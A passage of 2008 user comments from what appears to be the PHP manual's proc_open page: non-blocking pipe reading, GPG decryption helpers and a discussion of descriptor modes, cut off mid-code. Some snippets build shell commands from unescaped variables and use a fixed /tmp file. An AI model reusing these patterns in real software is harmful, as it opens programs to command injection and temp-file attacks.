<span class="default">&lt;?php<br />
$read_output </span><span class="keyword">= </span><span class="default">$read_error </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />
</span><span class="default">$buffer_len&nbsp; </span><span class="keyword">= </span><span class="default">$prev_buffer_len </span><span class="keyword">= </span><span class="default">0</span><span class="keyword">; <br />
</span><span class="default">$ms&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="keyword">= </span><span class="default">10</span><span class="keyword">;<br />
</span><span class="default">$output&nbsp; &nbsp; &nbsp; </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;<br />
</span><span class="default">$read_output </span><span class="keyword">= </span><span class="default">true</span><span class="keyword">;<br />
</span><span class="default">$error&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;<br />
</span><span class="default">$read_error&nbsp; </span><span class="keyword">= </span><span class="default">true</span><span class="keyword">;<br />
</span><span class="default">stream_set_blocking</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">0</span><span class="keyword">);<br />
</span><span class="default">stream_set_blocking</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">], </span><span class="default">0</span><span class="keyword">);<br />
<br />
</span><span class="comment">// dual reading of STDOUT and STDERR stops one full pipe blocking the other, because the external script is waiting<br />
</span><span class="keyword">while (</span><span class="default">$read_error </span><span class="keyword">!= </span><span class="default">false </span><span class="keyword">or </span><span class="default">$read_output </span><span class="keyword">!= </span><span class="default">false</span><span class="keyword">)<br />
{<br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">$read_output </span><span class="keyword">!= </span><span class="default">false</span><span class="keyword">)<br />
&nbsp;&nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if(</span><span class="default">feof</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">])) <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$read_output </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; else <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$str </span><span class="keyword">= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">1024</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$len </span><span class="keyword">= </span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">$len</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$output </span><span class="keyword">.= </span><span class="default">$str</span><span class="keyword">; <br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$buffer_len </span><span class="keyword">+= </span><span class="default">$len</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">$read_error </span><span class="keyword">!= </span><span class="default">false</span><span class="keyword">)<br />
&nbsp;&nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if(</span><span class="default">feof</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">])) <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$read_error </span><span class="keyword">= </span><span class="default">false</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; else <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$str </span><span class="keyword">= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">], </span><span class="default">1024</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$len </span><span class="keyword">= </span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$str</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">$len</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$error </span><span class="keyword">.= </span><span class="default">$str</span><span class="keyword">; <br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$buffer_len </span><span class="keyword">+= </span><span class="default">$len</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">$buffer_len </span><span class="keyword">&gt; </span><span class="default">$prev_buffer_len</span><span class="keyword">)<br />
&nbsp;&nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$prev_buffer_len </span><span class="keyword">= </span><span class="default">$buffer_len</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ms </span><span class="keyword">= </span><span class="default">10</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; else <br />
&nbsp;&nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">usleep</span><span class="keyword">(</span><span class="default">$ms </span><span class="keyword">* </span><span class="default">1000</span><span class="keyword">); </span><span class="comment">// sleep for $ms milliseconds<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">if (</span><span class="default">$ms </span><span class="keyword">&lt; </span><span class="default">160</span><span class="keyword">)<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ms </span><span class="keyword">= </span><span class="default">$ms </span><span class="keyword">* </span><span class="default">2</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
}<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; <br />
return </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">);<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="83635""></a>
  <div class="note">
   <strong class="user">snowleopard at amused dot NOSPAMPLEASE dot com dot au</strong>
   <a href="#83635" class="date">05-Jun-2008 07:46</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I managed to make a set of functions to work with GPG, since my hosting provider refused to use GPG-ME.<br />
Included below is an example of decryption using a higher descriptor to push a passphrase.<br />
Comments and emails welcome. :)<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">function </span><span class="default">GPGDecrypt</span><span class="keyword">(</span><span class="default">$InputData</span><span class="keyword">, </span><span class="default">$Identity</span><span class="keyword">, </span><span class="default">$PassPhrase</span><span class="keyword">, </span><span class="default">$HomeDir</span><span class="keyword">=</span><span class="string">"~/.gnupg"</span><span class="keyword">, </span><span class="default">$GPGPath</span><span class="keyword">=</span><span class="string">"/usr/bin/gpg"</span><span class="keyword">) {<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if(!</span><span class="default">is_executable</span><span class="keyword">(</span><span class="default">$GPGPath</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">trigger_error</span><span class="keyword">(</span><span class="default">$GPGPath </span><span class="keyword">. </span><span class="string">" is not executable"</span><span class="keyword">,<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">E_USER_ERROR</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; die();<br />
&nbsp;&nbsp;&nbsp; } else {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Set up the descriptors<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$Descriptors </span><span class="keyword">= array(<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">3 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">) </span><span class="comment">// This is the pipe we can feed the password into<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Build the command line and start the process<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$CommandLine </span><span class="keyword">= </span><span class="default">$GPGPath </span><span class="keyword">. </span><span class="string">' --homedir ' </span><span class="keyword">. </span><span class="default">$HomeDir </span><span class="keyword">. </span><span class="string">' --quiet --batch --local-user "' </span><span class="keyword">. </span><span class="default">$Identity </span><span class="keyword">. </span><span class="string">'" --passphrase-fd 3 --decrypt -'</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ProcessHandle </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">( </span><span class="default">$CommandLine</span><span class="keyword">, </span><span class="default">$Descriptors</span><span class="keyword">, </span><span class="default">$Pipes</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if(</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$ProcessHandle</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Push passphrase to custom pipe<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">3</span><span class="keyword">], </span><span class="default">$PassPhrase</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">3</span><span class="keyword">]);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; <br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Push input into StdIn<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="default">$InputData</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; <br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Read StdOut<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$StdOut </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; while(!</span><span class="default">feof</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">])) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$StdOut </span><span class="keyword">.= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">1024</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; <br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Read StdErr<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$StdErr </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; while(!</span><span class="default">feof</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]))&nbsp; &nbsp; {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$StdErr </span><span class="keyword">.= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">], </span><span class="default">1024</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$Pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// Close the process<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ReturnCode </span><span class="keyword">= </span><span class="default">proc_close</span><span class="keyword">(</span><span class="default">$ProcessHandle</span><span class="keyword">);<br />
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; } else {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">trigger_error</span><span class="keyword">(</span><span class="string">"cannot create resource"</span><span class="keyword">, </span><span class="default">E_USER_ERROR</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; die();<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">strlen</span><span class="keyword">(</span><span class="default">$StdOut</span><span class="keyword">) &gt;= </span><span class="default">1</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">$ReturnCode </span><span class="keyword">&lt;= </span><span class="default">0</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ReturnValue </span><span class="keyword">= </span><span class="default">$StdOut</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; } else {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ReturnValue </span><span class="keyword">= </span><span class="string">"Return Code: " </span><span class="keyword">. </span><span class="default">$ReturnCode </span><span class="keyword">. </span><span class="string">"\nOutput on StdErr:\n" </span><span class="keyword">. </span><span class="default">$StdErr </span><span class="keyword">. </span><span class="string">"\n\nStandard Output Follows:\n\n"</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; } else {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">$ReturnCode </span><span class="keyword">&lt;= </span><span class="default">0</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ReturnValue </span><span class="keyword">= </span><span class="default">$StdErr</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; } else {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$ReturnValue </span><span class="keyword">= </span><span class="string">"Return Code: " </span><span class="keyword">. </span><span class="default">$ReturnCode </span><span class="keyword">. </span><span class="string">"\nOutput on StdErr:\n" </span><span class="keyword">. </span><span class="default">$StdErr</span><span class="keyword">;<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; return </span><span class="default">$ReturnValue</span><span class="keyword">;<br />
}<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="83436""></a>
  <div class="note">
   <strong class="user">radone at gmail dot com</strong>
   <a href="#83436" class="date">26-May-2008 05:26</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
To complete the examples below that use proc_open to encrypt a string using GPG, here is a decrypt function:
<br />

<br />
<span class="default">&lt;?php
<br />
</span><span class="keyword">function </span><span class="default">gpg_decrypt</span><span class="keyword">(</span><span class="default">$string</span><span class="keyword">, </span><span class="default">$secret</span><span class="keyword">) {
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$homedir </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">; </span><span class="comment">// path to you gpg keyrings
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$tmp_file </span><span class="keyword">= </span><span class="string">'/tmp/gpg_tmp.asc' </span><span class="keyword">; </span><span class="comment">// tmp file to write to&nbsp; &nbsp; &nbsp; &nbsp; 
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">file_put_contents</span><span class="keyword">(</span><span class="default">$tmp_file</span><span class="keyword">, </span><span class="default">$string</span><span class="keyword">);
<br />

<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$text </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$error </span><span class="keyword">= </span><span class="string">''</span><span class="keyword">;
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$descriptorspec </span><span class="keyword">= array(
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">),&nbsp; </span><span class="comment">// stdin
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">),&nbsp; </span><span class="comment">// stdout
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">)&nbsp;&nbsp; </span><span class="comment">// stderr ?? instead of a file
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">);
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$command </span><span class="keyword">= </span><span class="string">'gpg --homedir ' </span><span class="keyword">. </span><span class="default">$homedir </span><span class="keyword">. </span><span class="string">' --batch --no-verbose --passphrase-fd 0 -d ' </span><span class="keyword">. </span><span class="default">$tmp_file </span><span class="keyword">. </span><span class="string">' '</span><span class="keyword">;
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="default">$command</span><span class="keyword">, </span><span class="default">$descriptorspec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">);
<br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">is_resource</span><span class="keyword">(</span><span class="default">$process</span><span class="keyword">)) {
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fwrite</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">], </span><span class="default">$secret</span><span class="keyword">);
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">0</span><span class="keyword">]);
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; while(</span><span class="default">$s</span><span class="keyword">= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">], </span><span class="default">1024</span><span class="keyword">)) {
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// read from the pipe
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$text </span><span class="keyword">.= </span><span class="default">$s</span><span class="keyword">;
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">]);
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="comment">// optional:
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">while(</span><span class="default">$s</span><span class="keyword">= </span><span class="default">fgets</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">], </span><span class="default">1024</span><span class="keyword">)) {
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$error </span><span class="keyword">.= </span><span class="default">$s </span><span class="keyword">. </span><span class="string">"\n"</span><span class="keyword">;
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">fclose</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">2</span><span class="keyword">]);
<br />
&nbsp;&nbsp;&nbsp; }
<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 
<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">file_put_contents</span><span class="keyword">(</span><span class="default">$tmp_file</span><span class="keyword">, </span><span class="string">''</span><span class="keyword">);
<br />
&nbsp;&nbsp;&nbsp; 
<br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">preg_match</span><span class="keyword">(</span><span class="string">'/decryption failed/i'</span><span class="keyword">, </span><span class="default">$error</span><span class="keyword">)) {
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">false</span><span class="keyword">;
<br />
&nbsp;&nbsp;&nbsp; } else {
<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; return </span><span class="default">$text</span><span class="keyword">;
<br />
&nbsp;&nbsp;&nbsp; }
<br />
}
<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="82951""></a>
  <div class="note">
   <strong class="user">jonah at whalehosting dot ca</strong>
   <a href="#82951" class="date">02-May-2008 10:22</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
@joachimb: The descriptorspec describes the i/o from the perspective of the process you are opening.&nbsp; That is why stdin is read: you are writing, the process is reading.&nbsp; So you want to open descriptor 2 (stderr) in write mode so that the process can write to it and you can read it.&nbsp; In your case where you want all descriptors to be pipes you should always use:<br />
<br />
<span class="default">&lt;?php<br />
$descriptorspec </span><span class="keyword">= array(<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'r'</span><span class="keyword">), </span><span class="comment">// stdin<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'w'</span><span class="keyword">), </span><span class="comment">// stdout<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">'pipe'</span><span class="keyword">, </span><span class="string">'w'</span><span class="keyword">) </span><span class="comment">// stderr<br />
</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
The examples below where stderr is opened as 'r' is a mistake.<br />
<br />
I would like to see examples of using higher descriptor numbers than 2.&nbsp; Specifically GPG as mentioned in the documentation.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="82889""></a>
  <div class="note">
   <strong class="user">joachimb at gmail dot com</strong>
   <a href="#82889" class="date">30-Apr-2008 08:24</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I'm confused by the direction of the pipes. Most of the examples in this documentation opens pipe #2 as "r", because they want to read from stderr. That sounds logical to me, and that's what I tried to do. That didn't work, though. When I changed it to w, as in<br />
<span class="default">&lt;?php<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; $descriptorspec </span><span class="keyword">= array(<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">0 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"r"</span><span class="keyword">), </span><span class="comment">// stdin<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">1 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">), </span><span class="comment">// stdout<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">2 </span><span class="keyword">=&gt; array(</span><span class="string">"pipe"</span><span class="keyword">, </span><span class="string">"w"</span><span class="keyword">) </span><span class="comment">// stderr<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; <br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$process </span><span class="keyword">= </span><span class="default">proc_open</span><span class="keyword">(</span><span class="default">escapeshellarg</span><span class="keyword">(</span><span class="default">$scriptFile</span><span class="keyword">), </span><span class="default">$descriptorspec</span><span class="keyword">, </span><span class="default">$pipes</span><span class="keyword">, </span><span class="default">$this</span><span class="keyword">-&gt;</span><span class="default">wd</span><span class="keyword">);<br />
...<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; while (!</span><span class="default">feof</span><span class="keyword">(</span><span class="default">$pipes</span><span class="keyword">[</span><span class="default">1</span><span class="keyword">])) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; foreach(</span><span class="default">$pipes </span><span class="keyword">as </span><span class="default">$key </span><span class="keyword">=&gt;</span><span class="default">$pipe</span><span class="keyword">) {<br />
